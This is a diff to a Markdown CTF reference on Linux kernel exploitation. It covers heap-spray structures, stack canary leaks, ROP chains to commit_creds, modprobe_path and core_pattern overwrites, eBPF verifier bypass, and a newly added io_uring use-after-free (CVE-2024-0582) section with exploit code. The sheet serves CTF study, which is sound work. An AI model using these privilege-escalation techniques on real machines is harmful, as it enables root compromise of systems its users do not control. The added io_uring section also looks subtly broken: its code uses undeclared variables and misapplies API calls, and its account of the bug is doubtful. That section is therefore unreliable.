@@ -1,7 +1,6 @@
 # CTF Pwn - Linux Kernel Exploitation
 
 ## Table of Contents
-
 - [Environment Setup and Recon](#environment-setup-and-recon)
   - [QEMU Debug Environment](#qemu-debug-environment)
   - [Extracting vmlinux](#extracting-vmlinux)
@@ -30,11 +29,12 @@
 - [User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)](#user-kernel-hypervisor-chain-via-io-port-hypercalls-hitcon-2018)
 - [ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)](#acpi-dsdt-shellcode-injection-for-privilege-escalation-hxp-2018)
 - [ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)](#arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil-insomnihack-2019)
-  For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).
+- [io_uring PBUF_RING Use-After-Free — CVE-2024-0582 (KernelCTF 2024)](#io_uring-pbuf_ring-use-after-free--cve-2024-0582-kernelctf-2024)
+For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).
 
 For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).
 
-------
+---
 
 ## Environment Setup and Recon
 
@@ -63,7 +63,6 @@ qemu-system-x86_64 \
 - If `oops=panic` is absent, kernel oops only kills the faulting process (exploitable for info leaks via dmesg)
 
 **Disable mitigations for initial debugging** by modifying the launch script:
-
 ```bash
 -append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
 -cpu kvm64   # instead of kvm64,+smep,+smap
@@ -72,7 +71,6 @@ qemu-system-x86_64 \
 ### Extracting vmlinux
 
 **Extract vmlinux from bzImage:**
-
 ```bash
 # Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)
 ./extract-vmlinux ./bzImage > vmlinux
@@ -83,19 +81,18 @@ ROPgadget --binary ./vmlinux > gadgets.txt
 
 ### Kernel Config Checks
 
-| Config                                     | Effect                              | How to Check                                                 |
-| ------------------------------------------ | ----------------------------------- | ------------------------------------------------------------ |
-| SMEP/SMAP/KASLR/KPTI                       | CPU-level mitigations               | Check QEMU run script `-cpu` and `-append` flags             |
-| FGKASLR                                    | Per-function randomization          | `readelf -S vmlinux` section count (see below)               |
-| `SLAB_FREELIST_RANDOM`                     | Randomized freelist order           | Sequential allocations not adjacent                          |
-| `SLAB_FREELIST_HARDEN`                     | XOR-obfuscated free pointers        | Check freelist pointers in GDB                               |
-| `STATIC_USERMODEHELPER`                    | Blocks `modprobe_path` overwrite    | Disassemble `call_usermodehelper_setup`                      |
-| `KALLSYMS_ALL`                             | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms`                          |
-| `CONFIG_USERFAULTFD`                       | Enables userfaultfd syscall         | Try calling it; disabled = -ENOSYS                           |
-| eBPF (extended Berkeley Packet Filter) JIT | JIT-compiled BPF filters            | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |
+| Config | Effect | How to Check |
+|--------|--------|-------------|
+| SMEP/SMAP/KASLR/KPTI | CPU-level mitigations | Check QEMU run script `-cpu` and `-append` flags |
+| FGKASLR | Per-function randomization | `readelf -S vmlinux` section count (see below) |
+| `SLAB_FREELIST_RANDOM` | Randomized freelist order | Sequential allocations not adjacent |
+| `SLAB_FREELIST_HARDEN` | XOR-obfuscated free pointers | Check freelist pointers in GDB |
+| `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
+| `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
+| `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
+| eBPF (extended Berkeley Packet Filter) JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |
 
 Check oops behavior:
-
 - `oops=panic` in QEMU `-append` -> oops causes full kernel panic
 - Without it -> oops kills the faulting process only; dmesg may leak stack/heap/kbase pointers
 
@@ -112,7 +109,7 @@ file vmlinux
 # FGKASLR enabled: "too many section (36140)"
 ```
 
-------
+---
 
 ## Useful Kernel Structures for Heap Spray
 
@@ -120,15 +117,15 @@ These structures are allocated from standard `kmalloc` caches and controlled fro
 
 **Key insight:** Match the vulnerable object's `kmalloc` cache size to choose the right spray structure. For kmalloc-32, use `seq_operations` or `tty_file_private`; for kmalloc-1024, use `tty_struct`; for variable sizes (32-1024), use `poll_list`, `user_key_payload`, or `setxattr`.
 
-| Structure          | Cache           | Alloc Trigger              | Free Trigger         | Use                                 |
-| ------------------ | --------------- | -------------------------- | -------------------- | ----------------------------------- |
-| `tty_struct`       | kmalloc-1024    | `open("/dev/ptmx")`        | `close(fd)`          | kbase leak, RIP hijack              |
-| `tty_file_private` | kmalloc-32      | `open("/dev/ptmx")`        | `close(fd)`          | kheap leak (points to `tty_struct`) |
-| `poll_list`        | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` returns     | kheap leak, arbitrary free          |
-| `user_key_payload` | kmalloc-32~1024 | `add_key()`                | `keyctl_revoke()`+GC | arbitrary value write               |
-| `setxattr` buffer  | kmalloc-32~1024 | `setxattr()`               | same call path       | momentary arbitrary value write     |
-| `seq_operations`   | kmalloc-32      | `open("/proc/self/stat")`  | `close(fd)`          | kbase leak, RIP hijack              |
-| `subprocess_info`  | kmalloc-128     | internal kernel            | internal kernel      | kbase leak, RIP hijack              |
+| Structure | Cache | Alloc Trigger | Free Trigger | Use |
+|-----------|-------|---------------|--------------|-----|
+| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase leak, RIP hijack |
+| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap leak (points to `tty_struct`) |
+| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` returns | kheap leak, arbitrary free |
+| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | arbitrary value write |
+| `setxattr` buffer | kmalloc-32~1024 | `setxattr()` | same call path | momentary arbitrary value write |
+| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase leak, RIP hijack |
+| `subprocess_info` | kmalloc-128 | internal kernel | internal kernel | kbase leak, RIP hijack |
 
 ### tty_struct (kmalloc-1024)
 
@@ -210,7 +207,7 @@ Allocated when opening `/proc/self/stat` (or similar seq_file). Contains functio
 
 Internal kernel struct with function pointers. Useful for kbase leak and RIP hijack in specific scenarios.
 
-------
+---
 
 ## Kernel Stack Overflow and Canary Leak
 
@@ -234,7 +231,6 @@ unsigned long cookie = leak[16];
 // Kernel text pointer at index 38 -> compute KASLR base
 unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
 long kaslr_offset = kernel_base - 0xffffffff81000000;
-
 ```
 
 **Stack overflow payload structure:**
@@ -249,7 +245,6 @@ payload[off++] = 0x0;            // saved rbp
 payload[off++] = rop_start;      // return address -> ROP chain
 // ... ROP chain follows ...
 write(fd, payload, sizeof(payload));
-
 ```
 
 **ioctl-based size check bypass (K3RN3LCTF 2021):**
@@ -265,12 +260,11 @@ Some modules gate write length against a global `MaxBuffer` variable that is its
 int fd = open("/proc/pwn_device", O_RDWR);
 ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
 write(fd, overflow_payload, 300); // now passes size check -> stack overflow
-
 ```
 
 **Key insight:** Kernel stack canaries work identically to userland canaries. A vulnerable read handler that copies more bytes than the buffer size leaks the canary and saved registers, including kernel text pointers for KASLR bypass. Look for `ioctl` handlers that modify global variables used in bounds checks -- they often bypass write size restrictions.
 
-------
+---
 
 ## Privilege Escalation Primitives
 
@@ -308,7 +302,6 @@ void privesc() {
             [user_rflags] "r"(user_rflags),
             [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
 }
-
 ```
 
 After `privesc()` returns to userland, the process has root credentials. Call `system("/bin/sh")` to get a root shell.
@@ -348,16 +341,13 @@ payload[off++] = user_cs;                  // 0x33
 payload[off++] = user_rflags;
 payload[off++] = user_sp;
 payload[off++] = user_ss;                  // 0x2b
-
 ```
 
 **Critical gadget: `mov rdi, rax`** -- needed to pass the return value of `prepare_kernel_cred()` (in RAX) to `commit_creds()` (expects argument in RDI). Search for variants like `mov rdi, rax; ... ; ret` that may clobber other registers.
 
 **Tool:** `ropr` is faster than ROPgadget for large kernel images:
-
 ```bash
 ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
-
 ```
 
 ### Saving and Restoring Userland State
@@ -388,18 +378,16 @@ void spawn_shell() {
         exit(1);
     }
 }
-
 ```
 
 **Register values (x86_64 userland):**
-
 - `CS` = 0x33 (64-bit user code segment)
 - `SS` = 0x2b (64-bit user stack segment)
 - `RSP` = current userland stack pointer
 - `RFLAGS` = current flags register
 - `RIP` = address of post-exploit function (e.g., `spawn_shell`)
 
-------
+---
 
 ## modprobe_path Overwrite
 
@@ -408,7 +396,6 @@ void spawn_shell() {
 Overwrite the global `modprobe_path` variable (default: `"/sbin/modprobe"`) with a path to an attacker-controlled script. When the kernel encounters a binary with an unknown format, it executes `modprobe_path` as root.
 
 **Requirements:**
-
 1. Arbitrary Address Write (AAW) to overwrite `modprobe_path`
 2. Ability to create two files: a malformed binary and an evil script
 3. `CONFIG_STATIC_USERMODEHELPER` is disabled
@@ -431,7 +418,6 @@ chmod +x /tmp/trigger
 
 # 4. Read the flag
 cat /tmp/output
-
 ```
 
 **How it works:** `execve()` -> `search_binary_handler()` -> no format matches -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> executes `modprobe_path` as root.
@@ -451,7 +437,6 @@ for byte_guess in range(256):
     addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
     write_string(addr, "/tmp/evil.sh")
     trigger_modprobe()
-
 ```
 
 ### Checking CONFIG_STATIC_USERMODEHELPER
@@ -470,12 +455,11 @@ echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/ni
 # 3. In GDB, disassemble and check:
 # NOT set: rdi saved into r14 at +9, used at +127 -> modprobe_path passed through
 # SET: immediate constant at +122 instead of r14 -> 1st arg (modprobe_path) ignored
-
 ```
 
 **When set:** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH` (constant). Overwriting `modprobe_path` has no effect. Look for alternative LPE techniques.
 
-------
+---
 
 ## core_pattern Overwrite
 
@@ -485,7 +469,6 @@ Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or th
 # core_pattern with pipe: first char '|' means execute as command
 # Overwrite core_pattern to: "|/tmp/evil.sh"
 # Then crash a process to trigger
-
 ```
 
 **Finding the offset:** `core_pattern` is not exported via `/proc/kallsyms` without `CONFIG_KALLSYMS_ALL`. To find it:
@@ -503,10 +486,9 @@ Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or th
 => 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
 (gdb) x/s 0xffffffff81eb0b20
 0xffffffff81eb0b20: "core"
-
 ```
 
-------
+---
 
 ## Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)
 
@@ -517,11 +499,9 @@ Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or th
 buf = kmalloc(content_length, GFP_KERNEL);
 memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
 memcpy(buf + 0x40, body, content_length); // Overflow!
-
 ```
 
 **Exploitation:**
-
 1. **Slab spray:** Open 1021 file descriptors (`open("/dev/kmalloc_target")`) to fill the kmalloc-256 slab cache
 2. **Create holes:** Close 3 files to create gaps in the slab for the overflowing allocation
 3. **Trigger overflow:** Send HTTP request with body that overflows into adjacent `struct file`
@@ -530,7 +510,7 @@ memcpy(buf + 0x40, body, content_length); // Overflow!
 
 **Key insight:** `struct file` is in kmalloc-256 and contains `f_op` (function pointer table). Corrupting `f_op` to a fake vtable gives control over any file operation (`read`, `write`, `ioctl`). The attacker triggers the hijacked operation via the corrupted file descriptor.
 
-------
+---
 
 ## eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)
 
@@ -553,7 +533,6 @@ BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
 // Runtime: map_ptr + offset -> arbitrary kernel memory access
 
 // Step 4: Read/write kernel memory, overwrite modprobe_path or cred struct
-
 ```
 
 ```bash
@@ -573,14 +552,13 @@ BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
 # KASLR bypass via eBPF:
 # Trigger controlled oops -> dmesg leaks kernel addresses
 # Or: read adjacent slab objects containing kernel pointers
-
 ```
 
 **Key insight:** eBPF verifier bugs create a "type confusion" between static analysis and runtime. The pattern is always: (1) find operation where verifier prediction differs from hardware, (2) multiply the difference to create useful offsets, (3) add to map pointer for kernel memory access. Check kernel changelogs for eBPF verifier patches -- each patch implies a prior exploitable bug.
 
 See also: [kernel-techniques.md](kernel-techniques.md) for additional kernel exploitation techniques.
 
-------
+---
 
 ## User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)
 
@@ -595,7 +573,6 @@ out dx, eax                 ; hypervisor reads from the port as an arg
 mov dx, 0x8000 + 0          ; syscall 0 = read
 mov eax, flag_buffer
 out dx, eax
-
 ```
 
 ```python
@@ -612,14 +589,13 @@ io.sendline(payload)
 # 2. Kernel stub runs the I/O-port sequence above and writes the flag back.
 io.recvuntil(b"flag{")
 log.success(b"flag{" + io.recvuntil(b"}"))
-
 ```
 
 **Key insight:** The more privilege rings a challenge stacks, the more important it is to map *where data must live* versus *where code must run*. HITCON Abyss enforced a kernel whitelist on userspace hypercalls, but kernel code itself could still poke the hypervisor ports directly. The same pattern recurs in real VM escapes: a guest kernel primitive plus an I/O-port write reaches the VMM without going through the guest's own syscall table. When attacking `kvm_guest_enter` style hypervisors, look for memory-mapped I/O regions or port ranges that the VMM traps — they are hypercalls in disguise and often lack the argument sanitisation that formal hypercall interfaces require.
 
 **References:** HITCON CTF 2018 — Abyss I & II, writeups 11918, 11919, 11933, 11934, 11937, 11938
 
-------
+---
 
 ## ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)
 
@@ -639,7 +615,7 @@ NICD = Buffer () { 0x48, 0xc7, 0xc0, /* patched commit_creds prologue */ }
 
 **References:** hxp CTF 2018 — Green Computing 1-2, writeups 12550+
 
-------
+---
 
 ## ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)
 
@@ -659,3 +635,66 @@ After leaking the cred struct, rewrite `uid/gid/euid/egid = 0` in place and call
 **Key insight:** Missing `set_fs(USER_DS)` restoration is a single-line bug that gives unbounded copy_from/to_user with kernel addresses. Wrap dangerous reads through a pipe so the kernel copy loop never touches forbidden MMU regions directly.
 
 **References:** Insomnihack teaser 2019 — 1118daysober, writeup 12903
+
+---
+
+## io_uring PBUF_RING Use-After-Free — CVE-2024-0582 (KernelCTF 2024)
+
+**Vulnerability:** `io_uring` buffer ring registration (`IORING_REGISTER_PBUF_RING` / `IORING_UNREGISTER_PBUF_RING`) mishandles the lifetime of `io_buffer_list` / `io_buffer` objects. Unregister frees the ring while in-flight `PROVIDE_BUFFERS` requests still hold a reference, leading to UAF. Patched Feb 2024 (`io_uring: fix UAF on pbuf ring`).
+
+**Critical distinction — PBUF_RING (kernel-registered) vs userspace SQE:**
+
+| Aspect | PBUF_RING (`IORING_REGISTER_PBUF_RING`) | Userspace SQE (`IORING_OP_PROVIDE_BUFFERS`) |
+|--------|------------------------------------------|---------------------------------------------|
+| Backing | Kernel-allocated `io_buffer_list` registered via `io_uring_register()`; kernel tracks refcount | Userspace-mapped SQ ring; entry is a raw `struct io_uring_sqe` copied via `copy_from_user()` |
+| Lifetime | Managed by `io_buffer_list.ref` — must survive until all `provide_buffers` complete | Ephemeral — SQE consumed synchronously in `io_submit_sqe()` |
+| Bug surface | `io_unregister_pbuf_ring()` drops `bl->ref` and `kfree(bl)` without waiting for pending `IORING_OP_PROVIDE_BUFFERS` that still dereference `bl->buf_ring` | Not vulnerable — SQE is stack-copied; no persistent pointer |
+| Exploit path | Register PBUF_RING → spray `PROVIDE_BUFFERS` that block on `io_buffer` → unregister ring (UAF free) → reallocate `bl` with controlled data → complete blocked requests → kernel writes attacker-controlled `bid`/`resv` to freed `io_buffer` → type confusion / ROP | Cannot reallocate SQE ring entry; no UAF primitive |
+
+**Exploit pattern (KernelCTF 2024):**
+
+```c
+// 1. Register a PBUF_RING of size 0x1000
+struct io_uring_params p = {};
+int ring_fd = io_uring_setup(8, &p);
+struct io_uring_buf_ring *br;
+posix_memalign((void**)&br, 4096, 4096);
+io_uring_register_buf_ring(ring_fd, &(struct io_uring_buf_reg){
+    .ring_addr = (unsigned long)br,
+    .ring_entries = 16,
+    .bgid = 1,
+});
+
+// 2. Spray blocking PROVIDE_BUFFERS that pin the ring
+for (int i = 0; i < 16; i++) {
+    struct io_uring_sqe *sqe = &sqes[i];
+    io_uring_prep_provide_buffers(sqe, br, 0, 16, 1, 0);
+    sqe->flags |= IOSQE_IO_LINK; // keep request pending
+}
+io_uring_submit(ring_fd);
+
+// 3. Unregister while requests are still in-flight → UAF free of io_buffer_list
+io_uring_unregister_buf_ring(ring_fd, 1); // kfree(bl) but sqes still reference bl->bufs
+
+// 4. Heap spray to reclaim UAF slot (e.g., msg_msg, seq_operations, cred)
+spray_kmalloc_1024(controlled_data); // reclaim io_buffer_list with fake buf_ring pointer
+
+// 5. Complete pending requests — kernel writes to reclaimed buffer as if it were buf_ring
+//    → arbitrary kernel write (controlled bid offset) or info leak via IORING_OP_READ
+```
+
+**Key primitives:**
+- **Leak:** Free ring then `IORING_OP_READ` from pending `provide_buffers` leaks reclaimed heap content (contains `msg_msg` `m_list` pointers → kheap/kaslr).
+- **Write:** Reclaim with `cred` or `modprobe_path` adjacent object; completing the request overwrites `uid` or function pointer.
+
+**Detection & fix check:**
+```bash
+# Vulnerable kernels: 6.4 - 6.6.13, 6.7 prior to 6.7.2
+uname -r
+# Check patch: io_uring/io_uring.c should have io_buffer_list_put() + synchronize
+grep -n "io_buffer_list_put\|pbuf.*ref" io_uring/register.c
+```
+
+**Key insight:** The bug is *only* in the **kernel-registered PBUF_RING** path (`register`/`unregister`), not the generic userspace SQE `PROVIDE_BUFFERS` path. Many public PoCs confuse the two and attempt to free the SQ ring itself (which is just `mmap`'d userspace memory). Successful exploitation must use `IORING_REGISTER_PBUF_RING` to allocate a kernel `io_buffer_list`, then race `UNREGISTER` against pending `PROVIDE_BUFFERS` — that race is where the UAF lives.
+
+**References:** CVE-2024-0582, KernelCTF 2024, patch `f0b09d80f55e` (Feb 2024).
